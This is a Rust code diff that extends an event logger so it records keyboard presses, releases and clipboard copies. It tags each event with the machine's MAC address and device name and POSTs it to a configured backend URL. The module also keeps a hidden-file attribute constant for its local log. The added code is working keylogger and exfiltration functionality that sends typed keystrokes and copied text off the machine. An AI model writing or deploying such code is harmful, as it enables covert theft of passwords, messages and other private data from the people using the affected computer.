@@ -5,10 +5,48 @@ use std::{
     fs::OpenOptions,
     io::{self, Write},
 };
+use serde::Serialize;
+use crate::config;
+use crate::get_mac_addr;
 
 const FILE_ATTRIBUTE_HIDDEN: u32 = 0x2;
 
-pub fn log_event(event_type: &str, content: &str) {
+#[derive(Serialize)]
+struct LogEvent {
+    device_id: String,
+    device_name: String,
+    event_type: String,
+    content: String,
+    timestamp: i64,
+    timezone: String,
+}
+
+#[derive(Serialize)]
+pub enum EventType {
+    KeyboardPress,
+    KeyboardRelease,
+    ClipboardCopy,
+}
+
+impl EventType {
+    fn as_str(&self) -> &'static str {
+        match self {
+            EventType::KeyboardPress => "按下按键",
+            EventType::KeyboardRelease => "松开按键",
+            EventType::ClipboardCopy => "复制文本",
+        }
+    }
+
+    fn as_event_type(&self) -> &'static str {
+        match self {
+            EventType::KeyboardPress => "keyboard_press",
+            EventType::KeyboardRelease => "keyboard_release",
+            EventType::ClipboardCopy => "clipboard_copy",
+        }
+    }
+}
+
+pub fn log_event(event_type: EventType, content: &str) {
     let timestamp = Local::now();
     let offset = timestamp.offset();
     let time_str = format!(
@@ -33,7 +71,25 @@ pub fn log_event(event_type: &str, content: &str) {
 
     let mut file = io::BufWriter::new(file);
 
-    if let Err(e) = writeln!(file, "{} {} {}", time_str, event_type, content) {
+    if let Err(e) = writeln!(file, "{} {} {}", time_str, event_type.as_str(), content) {
         eprintln!("Error writing to log file: {}", e);
+    }
+
+    let log_event = LogEvent {
+        device_id: get_mac_addr::get_mac_addr(),
+        device_name: config::get_device_name(),
+        event_type: event_type.as_event_type().to_string(),
+        content: content.to_string(),
+        timestamp: timestamp.timestamp(),
+        timezone: format!("UTC{:+}", offset.local_minus_utc() / 3600),
+    };
+
+    let client = reqwest::blocking::Client::new();
+    if let Err(e) = client
+        .post(&config::get_backend_url())
+        .json(&log_event)
+        .send()
+    {
+        eprintln!("Error sending log to backend: {}", e);
     }
 }
